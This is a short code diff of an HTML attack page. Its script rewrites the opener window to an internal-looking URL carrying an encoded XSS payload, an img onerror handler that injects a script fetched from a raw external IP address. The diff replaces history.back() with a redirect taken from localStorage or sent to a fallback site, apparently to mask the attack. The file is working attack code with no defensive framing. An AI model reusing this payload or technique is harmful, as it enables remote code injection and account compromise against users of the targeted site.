@@ -4,7 +4,11 @@
 <link href="https://www.atatech.org/favicon.ico" rel="shortcut icon" type="image/x-icon">
 <script>
 opener.location = 'http://meta.alibaba-inc.com/store/table/table_detail.html?guid=%3Cimg%20src%20onerror%3Dwith(document)body.appendChild(createElement(%27script%27)).src%3D%27http://47.90.64.188/lab/83284719.js%27;%3E#/tableDetails/columnInfo';
-history.back();
+var url;
+try {
+  url = localStorage.ref;
+} catch(err) {}
+location = url || 'https://www.atatech.org/';
 </script>
 </head>
 </html>
